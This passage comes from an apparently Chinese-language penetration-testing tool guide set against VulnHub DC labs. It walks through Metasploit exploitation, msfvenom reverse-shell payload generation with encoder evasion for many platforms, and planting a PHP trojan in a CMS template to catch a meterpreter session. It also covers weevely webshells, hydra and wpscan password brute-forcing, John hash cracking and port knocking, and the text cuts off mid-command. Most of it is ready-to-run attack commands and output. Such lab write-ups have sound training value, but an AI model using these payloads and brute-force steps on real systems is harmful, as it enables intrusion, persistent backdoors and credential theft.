<p><code>Required</code>是要求填的，yes是必填项，no是非必填项</p>
<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110143969.png"><img src="/tooluse(Commontools)/image-20220830110143969.png" alt="image-20220830110143969"></a></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">再输入<span class="built_in">run</span>，运行脚本</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110303594.png"><img src="/tooluse(Commontools)/image-20220830110303594.png" alt="image-20220830110303594"></a></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">shell</span>，进入<span class="built_in">shell</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110551273.png"><img src="/tooluse(Commontools)/image-20220830110551273.png" alt="image-20220830110551273"></a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，查看当前的权限</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110648417.png"><img src="/tooluse(Commontools)/image-20220830110648417.png" alt="image-20220830110648417"></a></p>
<p>发现是个低权限的账号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span>，可以查看到当前的目录文件</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110825217.png"><img src="/tooluse(Commontools)/image-20220830110825217.png" alt="image-20220830110825217"></a></p>
<p>但是一堆东西挤在一起，还是有些不太方便</p>
<p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830110907408.png"><img src="/tooluse(Commontools)/image-20220830110907408.png" alt="image-20220830110907408"></a></p>
<h3 id="（2）msf后门生成模块"><a href="#（2）msf后门生成模块" class="headerlink" title="（2）msf后门生成模块"></a>（2）msf后门生成模块</h3><h4 id="普通生成"><a href="#普通生成" class="headerlink" title="普通生成"></a>普通生成</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">p</span> 有效载荷 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">msfvenom -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -f exe -o payload<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<h4 id="编码生成"><a href="#编码生成" class="headerlink" title="编码生成"></a>编码生成</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 <span class="attribute">lhost</span>=攻击机IP <span class="attribute">lport</span>=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.1.1 <span class="attribute">lport</span>=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br></pre></td></tr></table></figure>

<h4 id="以DC-3举个例子"><a href="#以DC-3举个例子" class="headerlink" title="*以DC-3举个例子"></a>*以DC-3举个例子</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">输入msfvenom -<span class="selector-tag">p</span> php/meterpreter/reverse_tcp LHOST=kali的ip LPORT=<span class="number">4444</span> -f raw &gt; shell<span class="selector-class">.php</span></span><br><span class="line"><span class="comment">//注意，LHOST是kali的ip</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903222910397.png"><img src="/tooluse(Commontools)/image-20220903222910397.png" alt="image-20220903222910397"></a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903144052531.png"><img src="/tooluse(Commontools)/image-20220903144052531.png" alt="image-20220903144052531"></a></p>
<p>发现目录下生成了 <code>shell.php</code></p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903223007361.png"><img src="/tooluse(Commontools)/image-20220903223007361.png" alt="image-20220903223007361"></a></p>
<p>然后在网站新建一个php文件</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903221140645.png"><img src="/tooluse(Commontools)/image-20220903221140645.png" alt="image-20220903221140645"></a></p>
<p>然后把木马内容导入进去</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903223039265.png"><img src="/tooluse(Commontools)/image-20220903223039265.png" alt="image-20220903223039265"></a></p>
<p>然后保存一下</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903221238918.png"><img src="/tooluse(Commontools)/image-20220903221238918.png" alt="image-20220903221238918"></a></p>
<p>然后试试能不能访问木马</p>
<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
<p>因为我们文件是在<code>/templates/protostar/less/</code>下上传的，所以访问</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar<span class="regexp">/less/</span><span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903221336853.png"><img src="/tooluse(Commontools)/image-20220903221336853.png" alt="image-20220903221336853"></a></p>
<p>看到&#x2F;*，看来是可以成功访问</p>
<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用msf进行利用</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">先输入msfconsole，进入msf</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">然后输入</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">进入我们利用msf制作的木马利用环境</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903220102252.png"><img src="/tooluse(Commontools)/image-20220903220102252.png" alt="image-20220903220102252"></a></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">看看需要填写什么</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903220250819.png"><img src="/tooluse(Commontools)/image-20220903220250819.png" alt="image-20220903220250819"></a></p>
<p>看到LHOST监听的ip没有填写</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span> //<span class="comment">kali</span>的<span class="comment">ip</span></span><br></pre></td></tr></table></figure>



<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">run</span>，运行，会卡住</span><br></pre></td></tr></table></figure>

<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903223414089.png"><img src="/tooluse(Commontools)/image-20220903223414089.png" alt="image-20220903223414089"></a></p>
<p>后面操作不赘述</p>
<h4 id="msfvenom-—list-archs"><a href="#msfvenom-—list-archs" class="headerlink" title="msfvenom —list archs"></a>msfvenom —list archs</h4><p>#查看支持的系统架构</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">aarch<span class="number">64</span><span class="punctuation">,</span> armbe<span class="punctuation">,</span> armle<span class="punctuation">,</span> cbea<span class="punctuation">,</span> cbea<span class="number">64</span><span class="punctuation">,</span> cmd<span class="punctuation">,</span> dalvik<span class="punctuation">,</span> firefox<span class="punctuation">,</span> java<span class="punctuation">,</span> mips<span class="punctuation">,</span> mips<span class="number">64</span><span class="punctuation">,</span> mips<span class="number">64</span>le<span class="punctuation">,</span> mipsbe<span class="punctuation">,</span> mipsle<span class="punctuation">,</span> nodejs<span class="punctuation">,</span> php<span class="punctuation">,</span> ppc<span class="punctuation">,</span> ppc<span class="number">64</span><span class="punctuation">,</span> ppc<span class="number">64</span>le<span class="punctuation">,</span> ppce<span class="number">500</span>v<span class="number">2</span><span class="punctuation">,</span> python<span class="punctuation">,</span> r<span class="punctuation">,</span> ruby<span class="punctuation">,</span> sparc<span class="punctuation">,</span> sparc<span class="number">64</span><span class="punctuation">,</span> tty<span class="punctuation">,</span> <span class="keyword">x</span><span class="number">64</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span><span class="punctuation">,</span> zarch</span><br></pre></td></tr></table></figure>

<h4 id="msfvenom-—list-platforms"><a href="#msfvenom-—list-platforms" class="headerlink" title="msfvenom —list platforms"></a>msfvenom —list platforms</h4><p>#查看支持系统平台</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">aix, <span class="keyword">android, </span>apple_ios, <span class="keyword">bsd, </span><span class="keyword">bsdi, </span>cisco, firefox, freebsd, hardware, hpux, irix, <span class="keyword">java, </span><span class="keyword">javascript, </span><span class="keyword">juniper, </span>linux, mainframe, <span class="keyword">multi, </span>netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows</span><br></pre></td></tr></table></figure>



<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">msfvenom -l payload <span class="comment">#列出所有可用的payload</span></span><br><span class="line"></span><br><span class="line">msfvenom -l formats <span class="comment">#列出所有的输出格式</span></span><br><span class="line"></span><br><span class="line">msfvenom -l <span class="built_in">encrypt</span> <span class="comment">#列出所有的加密方式</span></span><br><span class="line"></span><br><span class="line">msfvenom -l encoders <span class="comment">#列出所有的编码器</span></span><br></pre></td></tr></table></figure>

<h4 id="常见生成格式"><a href="#常见生成格式" class="headerlink" title="常见生成格式"></a>常见生成格式</h4><h5 id="1、-Windows"><a href="#1、-Windows" class="headerlink" title="1、 Windows"></a>1、 Windows</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> windows -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -<span class="selector-tag">i</span> <span class="number">3</span> -e x86/shikata_ga_nai -f exe -o payload<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<h5 id="2、Linux"><a href="#2、Linux" class="headerlink" title="2、Linux"></a>2、Linux</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload<span class="selector-class">.elfxxxxxxxxxx</span> msfvenom <span class="attr">--platform</span> linux -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1</span><br></pre></td></tr></table></figure>

<h5 id="3、Mac"><a href="#3、Mac" class="headerlink" title="3、Mac"></a>3、Mac</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> osx -<span class="selector-tag">a</span> x86 -<span class="selector-tag">p</span> osx/x86/shell_reverse_tcp -f macho -o payload<span class="selector-class">.macho</span></span><br></pre></td></tr></table></figure>

<h5 id="4、Android"><a href="#4、Android" class="headerlink" title="4、Android"></a>4、Android</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp -o payload.apk</span><br></pre></td></tr></table></figure>

<h5 id="5、Aspx"><a href="#5、Aspx" class="headerlink" title="5、Aspx"></a>5、Aspx</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> windows-<span class="selector-tag">p</span> windows/meterpreter/reverse_tcp -f aspx -o payload<span class="selector-class">.aspx</span></span><br></pre></td></tr></table></figure>

<h5 id="6、JSP"><a href="#6、JSP" class="headerlink" title="6、JSP"></a>6、JSP</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="attr">--platform</span> java -<span class="selector-tag">p</span> java/jsp_shell_reverse_tcp -f raw -o payload<span class="selector-class">.jsp</span></span><br></pre></td></tr></table></figure>

<h5 id="7、PHP"><a href="#7、PHP" class="headerlink" title="7、PHP"></a>7、PHP</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php</span><br></pre></td></tr></table></figure>

<h5 id="8、BASH"><a href="#8、BASH" class="headerlink" title="8、BASH"></a>8、BASH</h5><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">msfvenom -p <span class="keyword">cmd</span><span class="language-bash">/unix/reverse_bash -f raw -o shell.sh</span></span><br></pre></td></tr></table></figure>

<h5 id="9、Python"><a href="#9、Python" class="headerlink" title="9、Python"></a>9、Python</h5><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">msfvenom -<span class="keyword">p</span> <span class="keyword">python</span>/meterpreter/reverse_tcp -<span class="keyword">f</span> raw -<span class="keyword">o</span> <span class="keyword">shell</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>



<h4 id="Msfvenom常用命令参数"><a href="#Msfvenom常用命令参数" class="headerlink" title="Msfvenom常用命令参数"></a>Msfvenom常用命令参数</h4><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">-l, <span class="comment">--list &lt;type&gt; </span></span><br><span class="line"><span class="comment"># 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span></span><br><span class="line">-p, <span class="comment">--payload &lt;payload&gt; </span></span><br><span class="line"><span class="comment"># 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line"><span class="comment">--list-options </span></span><br><span class="line"><span class="comment"># 列出--payload &lt;value&gt; 的标准，高级和规避选项</span></span><br><span class="line">-f, <span class="comment">--format &lt;format&gt; </span></span><br><span class="line"><span class="comment"># 指定 Payload 的输出格式(使用 --list formats 列出)</span></span><br><span class="line">-e, <span class="comment">--encoder &lt;encoder&gt; </span></span><br><span class="line"><span class="comment"># 指定使用的 Encoder (使用 --list encoders 列出)</span></span><br><span class="line"><span class="comment">--sec-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span></span><br><span class="line"><span class="comment">--smallest </span></span><br><span class="line"><span class="comment"># 使用所有可用的编码器生成最小的payload</span></span><br><span class="line"><span class="comment">--encrypt &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span></span><br><span class="line"><span class="comment">--encrypt-key &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 用于加密的密钥</span></span><br><span class="line"><span class="comment">--encrypt-iv &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 加密的初始化向量</span></span><br><span class="line">-<span class="keyword">a</span>, <span class="comment">--arch &lt;arch&gt; </span></span><br><span class="line"><span class="comment"># 指定目标系统架构(使用 --list archs 列出)</span></span><br><span class="line"><span class="comment">--platform &lt;platform&gt; </span></span><br><span class="line"><span class="comment"># 指定目标系统平台 (使用 --list platforms 列出)</span></span><br><span class="line">-o, <span class="comment">--out &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 保存payload文件</span></span><br><span class="line">-b, <span class="comment">--bad-chars &lt;list&gt; </span></span><br><span class="line"><span class="comment"># 设置需要在 Payload 中避免出现的字符，如： &#x27;\x00\xff&#x27;</span></span><br><span class="line">-n, <span class="comment">--nopsled &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 指定 nop 在 payload 中的数量</span></span><br><span class="line">-s, <span class="comment">--space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 设置未经编码的 Payload 的最大长度</span></span><br><span class="line"><span class="comment">--encoder-space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># 编码后的 Payload 的最大长度</span></span><br><span class="line">-i, <span class="comment">--iterations &lt;count&gt; </span></span><br><span class="line"><span class="comment"># 设置 Payload 的编码次数</span></span><br><span class="line">-c, <span class="comment">--add-code &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line">-x, <span class="comment">--template &lt;path&gt; </span></span><br><span class="line"><span class="comment"># 指定一个特定的可执行文件作为模板</span></span><br><span class="line">-k, <span class="comment">--keep </span></span><br><span class="line"><span class="comment"># 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line">-v, <span class="comment">--var-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span></span><br><span class="line">-t, <span class="comment">--timeout &lt;second&gt; </span></span><br><span class="line"><span class="comment"># 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span></span><br><span class="line">-h, <span class="comment">--help </span></span><br><span class="line"><span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure>



<h2 id="2）hydra"><a href="#2）hydra" class="headerlink" title="2）hydra"></a>2）hydra</h2><blockquote>
<p><code>hydra是一个自动化的爆破工具,暴力破解弱密码,是一个支持众多协议的爆破工具</code></p>
</blockquote>
<h3 id="1-爆破用户密码"><a href="#1-爆破用户密码" class="headerlink" title="1.爆破用户密码"></a>1.爆破用户密码</h3><p><strong>这里以vulnhub dc1为例</strong></p>
<p>用了<code>hydra</code>[海德拉]工具，对<code>flag4</code>用户进行爆破</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -<span class="selector-tag">p</span> /usr/share/wordlists/rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span> <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-l是指定用户或指定包含多个用户的文件，-<span class="selector-tag">p</span>是指定密码或指定包含多个密码的文件，ssh就是</span><br><span class="line">用户所在的网站</span><br><span class="line"></span><br><span class="line">上面-<span class="selector-tag">p</span>的文件是kali自带的密码包，当然也可以用其他的</span><br><span class="line"></span><br><span class="line">-s 端口</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830211739164.png"><img src="/tooluse(Commontools)/image-20220830211739164.png" alt="image-20220830211739164"></a></p>
<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>
<p>然后用<code>ssh</code>连接</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">然后yes</span><br><span class="line">然后输入密码：orange</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830211817515.png"><img src="/tooluse(Commontools)/image-20220830211817515.png" alt="image-20220830211817515"></a></p>
<h2 id="3）cewl"><a href="#3）cewl" class="headerlink" title="3）cewl"></a>3）cewl</h2><blockquote>
<p> <code>Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。Cewl是通过ruby编写,通过爬取网站并提取独立的单词保存为字典,可以和John the Ripper等工具配合使用。</code></p>
<p> <code>主要还是根据网站自身的关键词，然后生成的字典，比如cewl，flag等等</code></p>
</blockquote>
<p><strong>这里以vulnhub dc2为例</strong></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">-w等同于&gt;   <span class="comment">//写入</span></span><br><span class="line">-m n       <span class="comment">//至少生成的长度为n，默认是3</span></span><br><span class="line">-d x       <span class="comment">//生成更大的字典，默认x=2</span></span><br></pre></td></tr></table></figure>



<p>我们用<code>cewl</code>试试生成字典</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">输入cewl http:<span class="comment">//dc-2/ &gt;pass.txt</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831221031390.png"><img src="/tooluse(Commontools)/image-20220831221031390.png" alt="image-20220831221031390"></a></p>
<p>目录下就会生成<code>pass.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cat</span> pass.txt，查看内容</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831221151099.png"><img src="/tooluse(Commontools)/image-20220831221151099.png" alt="image-20220831221151099"></a></p>
<p>发现是生成对应网站的密码字典</p>
<h2 id="4）wpscan"><a href="#4）wpscan" class="headerlink" title="4）wpscan"></a>4）wpscan</h2><blockquote>
<p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
</blockquote>
<p><strong>这里以vulnhub dc2为例</strong></p>
<figure class="highlight qml"><table><tr><td class="code"><pre><span class="line">wpscan -<span class="built_in">url</span> <span class="attribute">http</span>:<span class="comment">//dc-2 -e u</span></span><br><span class="line"></span><br><span class="line">-e u    <span class="comment">//枚举用户信息</span></span><br><span class="line"></span><br><span class="line">wpscan -<span class="built_in">url</span> xx -P xx -U xx</span><br><span class="line">-P passwdspath  <span class="comment">//密码字典路径，或者直接写</span></span><br><span class="line">-U userspath    <span class="comment">//用户名字典路径，或者直接写</span></span><br></pre></td></tr></table></figure>



<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">输入wpscan <span class="params">--url</span> http:<span class="string">//dc-2</span> -e u</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831223359965.png"><img src="/tooluse(Commontools)/image-20220831223359965.png" alt="image-20220831223359965"></a></p>
<p>然后往下看用户名</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831223432802.png"><img src="/tooluse(Commontools)/image-20220831223432802.png" alt="image-20220831223432802"></a></p>
<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">输入vi un.txt,把admin <span class="keyword">jerry </span>tom复制进去</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831223714569.png"><img src="/tooluse(Commontools)/image-20220831223714569.png" alt="image-20220831223714569"></a></p>
<p>然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">输入wpscan <span class="params">--url</span> http:<span class="string">//dc-2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831223950721.png"><img src="/tooluse(Commontools)/image-20220831223950721.png" alt="image-20220831223950721"></a></p>
<p>稍微等一会</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220831224205560.png"><img src="/tooluse(Commontools)/image-20220831224205560.png" alt="image-20220831224205560"></a></p>
<p>admin用户密码没有找到，应该是最高权限的账号</p>
<p>但是jerry和tom用户的密码知道了</p>
<h2 id="5）John"><a href="#5）John" class="headerlink" title="5）John"></a>5）John</h2><p>John是一个破解系统密码的工具</p>
<p>使用很简单</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">john passwd<span class="selector-class">.txt</span> <span class="comment">//这里是直接利用john自带的密码本，后面接的是需要爆破的密码文本文件</span></span><br><span class="line"></span><br><span class="line">john <span class="attr">--wordlist</span>=字典路径 passwd<span class="selector-class">.txt</span> <span class="comment">//这里是指定密码本，后面接的是需要爆破的密码文本文件</span></span><br></pre></td></tr></table></figure>



<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">john <span class="attr">--show</span> passwd<span class="selector-class">.txt</span> <span class="comment">//这是查看该密码文本中已经被爆破成功过的密码</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220903140126704.png"><img src="/tooluse(Commontools)/image-20220903140126704.png" alt="image-20220903140126704"></a></p>
<p>就可以看到明文为<code>snoopy</code></p>
<h2 id="6）weevely"><a href="#6）weevely" class="headerlink" title="6）weevely"></a>6）weevely</h2><blockquote>
<p>Weevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具</p>
</blockquote>
<p>生成Shell</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;文件名&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure>

<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
<p>利用触发shell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220904133118746.png"><img src="/tooluse(Commontools)/image-20220904133118746.png" alt="image-20220904133118746"></a></p>
<p>成功进入shell</p>
<h2 id="7）whatweb"><a href="#7）whatweb" class="headerlink" title="7）whatweb"></a>7）whatweb</h2><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">whatweb http:<span class="comment">//192.168.220.156/ &gt;&gt; whatweb.txt</span></span><br><span class="line"><span class="comment">//把网站的框架信息导入到文本whatweb.txt中</span></span><br></pre></td></tr></table></figure>

<p>这个工具主要是查看网站的框架，和<code>wapplzer</code>类似</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20221103104233193.png"><img src="/tooluse(Commontools)/image-20221103104233193.png" alt="image-20221103104233193"></a></p>
<h2 id="8）knockd"><a href="#8）knockd" class="headerlink" title="8）knockd"></a>8）knockd</h2><blockquote>
<p>在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。</p>
<p>端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到Internet，则可以使用端口断开功能。<br>它允许您关闭防火墙上允许传入连接的端口，并在进行预先安排的连接尝试方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。</p>
</blockquote>
<p>什么意思呢，也就是说，我先关闭了一个端口</p>
<p>但是呢，我为了我想要的人访问它，我写了一个<code>敲门的顺序（也就是访问端口的顺序）</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">顺序在<span class="regexp">/etc/</span>knockd.conf</span><br></pre></td></tr></table></figure>

<p>比如，</p>
<p>我关闭了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">22/ssh端口</span><br></pre></td></tr></table></figure>

<p>我写了一个顺序</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7893</span>,<span class="number">6452</span>,<span class="number">2412</span></span><br></pre></td></tr></table></figure>

<p>这是三个端口</p>
<p>我为什么为你<code>打开22端口</code>，原因是因为你<code>敲对了顺序</code></p>
<p>这里就涉及<code>敲门的方法</code></p>
<h3 id="1-knock命令"><a href="#1-knock命令" class="headerlink" title="1&gt; knock命令"></a>1&gt; knock命令</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.1.8</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span> //<span class="number">192.168.1.8</span>为目标ip</span><br></pre></td></tr></table></figure>

<h3 id="2-nc命令"><a href="#2-nc命令" class="headerlink" title="2&gt;nc命令"></a>2&gt;nc命令</h3><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">$ nc -v dc9 <span class="number">7469</span></span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">7469</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">8475</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span class="string">[10.0.0.14]</span> <span class="number">8475</span> (?) : Connection refused</span><br><span class="line"></span><br><span class="line">$ nc -v dc9 <span class="number">9842</span>                                                                                       </span><br><span class="line"><span class="number">10.0.0.14</span>: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) <span 